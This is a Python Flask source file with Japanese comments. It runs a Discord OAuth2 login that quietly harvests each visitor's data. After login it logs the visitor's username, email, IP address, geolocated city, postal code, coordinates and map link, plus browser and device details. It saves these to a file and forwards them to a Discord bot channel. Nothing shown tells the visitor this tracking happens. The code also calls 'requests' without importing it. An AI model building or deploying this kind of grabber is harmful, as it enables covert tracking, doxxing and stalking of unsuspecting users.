import os
import json
import threading
from datetime import datetime
from flask import Flask, request, render_template
from user_agents import parse
from dotenv import load_dotenv
import geoip2.database
from discord_bot import bot, enqueue_task

load_dotenv()
app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")

GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")

# GeoIP2 Reader
geo_reader = geoip2.database.Reader(GEOIP_DB_PATH)

def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

def get_geo_info(ip):
    try:
        response = geo_reader.city(ip)
        lat = response.location.latitude
        lon = response.location.longitude
        region = response.subdivisions.most_specific.name or "不明"
        city = response.city.name or "不明"
        postal = response.postal.code or "不明"
        return {
            "ip": ip,
            "country": response.country.name or "不明",
            "region": region,
            "city": city,
            "zip": postal,
            "lat": lat,
            "lon": lon,
            "map_link": f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None,
            "proxy": False,   # GeoIP2 無料DBでは判定不可
            "hosting": False
        }
    except:
        return {
            "ip": ip,
            "country": "不明",
            "region": "不明",
            "city": "不明",
            "zip": "不明",
            "lat": None,
            "lon": None,
            "map_link": None,
            "proxy": False,
            "hosting": False
        }

def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    data["timestamp"] = now
    logs[discord_id]["history"].append(data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    # Discord OAuth2 トークン取得
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": DISCORD_REDIRECT_URI,
        "scope": "identify email guilds connections",
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token = res.json()
    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()

    ip = get_client_ip()
    geo = get_geo_info(ip)
    ua = parse(request.headers.get("User-Agent", ""))

    log_data = {
        "username": f"{user.get('username')}#{user.get('discriminator')}",
        "email": user.get("email"),
        "ip": geo["ip"],
        "country": geo["country"],
        "region": geo["region"],
        "city": geo["city"],
        "zip": geo["zip"],
        "lat": geo["lat"],
        "lon": geo["lon"],
        "map_link": geo["map_link"],
        "proxy": geo["proxy"],
        "hosting": geo["hosting"],
        "browser": f"{ua.browser.family} {ua.browser.version_string}",
        "os": f"{ua.os.family} {ua.os.version_string}",
        "device": ua.device.family
    }

    save_log(user.get("id"), log_data)

    # Bot にタスク送信（安全に enqueue）
    enqueue_task(embed_data={"title": "新規アクセス", "description": f"{log_data}"}, user_id=user.get("id"))

    return render_template("welcome.html", username=log_data["username"], log=log_data)

def start_bot_thread():
    threading.Thread(target=lambda: bot.run(DISCORD_BOT_TOKEN), daemon=True).start()

if __name__ == "__main__":
    start_bot_thread()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
